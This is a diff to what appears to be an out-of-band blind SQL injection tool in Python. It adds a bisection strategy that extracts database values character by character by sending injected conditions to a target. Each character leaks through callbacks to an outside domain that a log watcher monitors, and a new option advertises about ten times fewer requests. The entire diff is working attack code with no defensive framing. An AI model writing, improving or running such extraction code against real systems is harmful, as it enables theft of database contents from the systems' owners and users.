@@ -71,6 +71,30 @@ def send_payload(args, request, payload):
             print(f"[http] ignored error: {exc}")
 
 
+def extract_char_binary(args, profile, request, domain, log, run_id, expression, pos, alphabet):
+    chars = sorted(set(alphabet))
+    if not chars:
+        return None
+    lo, hi = 0, len(chars) - 1
+    while lo < hi:
+        mid = (lo + hi + 1) // 2
+        token = f"{run_id}-p{pos:02d}-b{mid:02x}"
+        condition = profile.condition_gte(expression, pos, chars[mid])
+        payload = profile.payload(args.base, condition, f"{token}.{domain}")
+        send_payload(args, request, payload)
+        if log.wait_any({token: chars[mid]}, args.timeout):
+            lo = mid
+        else:
+            hi = mid - 1
+    # Confirm candidate — absence means end-of-string
+    candidate = chars[lo]
+    token_eq = f"{run_id}-p{pos:02d}-c{ord(candidate):02x}"
+    condition_eq = profile.condition(expression, pos, candidate)
+    payload_eq = profile.payload(args.base, condition_eq, f"{token_eq}.{domain}")
+    send_payload(args, request, payload_eq)
+    return candidate if log.wait_any({token_eq: candidate}, args.timeout) else None
+
+
 def run_check(args, profile, request, domain, log, run_id) -> int:
     print(f"[+] profile: {profile.name}")
     print(f"[+] {profile.comment}")
@@ -174,23 +198,25 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
     print(f"[+] session: {session.path}")
 
     for pos in range(start_pos, max_len + 1):
-        token_map: dict[str, str] = {}
+        if getattr(args, "strategy", "batch") == "binary":
+            char = extract_char_binary(args, profile, request, domain, log, run_id, expression, pos, alphabet)
+        else:
+            token_map: dict[str, str] = {}
+            for c in alphabet:
+                token = token_for(run_id, pos, c)
+                token_map[token] = c
+                condition = profile.condition(expression, pos, c)
+                payload = profile.payload(args.base, condition, f"{token}.{domain}")
+                send_payload(args, request, payload)
+            token = log.wait_any(token_map, args.timeout)
+            char = token_map[token] if token else None
 
-        for char in alphabet:
-            token = token_for(run_id, pos, char)
-            token_map[token] = char
-            condition = profile.condition(expression, pos, char)
-            payload = profile.payload(args.base, condition, f"{token}.{domain}")
-            send_payload(args, request, payload)
-
-        token = log.wait_any(token_map, args.timeout)
-        if not token:
+        if not char:
             print(f"[+] done: {result}")
             session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, True)
             session.close()
             return result
 
-        char = token_map[token]
         result += char
         session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
         print(f"[+] pos {pos:02d}: {char} -> {result}", flush=True)
@@ -449,6 +475,12 @@ def add_common(parser):
     parser.add_argument("--flush-session", action="store_true", help="delete the target session before running")
     parser.add_argument("--fresh-queries", action="store_true", help="ignore cached extraction results but keep the session")
     parser.add_argument("-D", "--database", help="database/schema/catalog to use for metadata and dump queries")
+    parser.add_argument(
+        "--strategy",
+        choices=["batch", "binary"],
+        default="batch",
+        help="batch: send full alphabet per position (default); binary: bisection, ~10x fewer requests",
+    )
     parser.add_argument("-v", "--verbose", action="store_true")
 
 
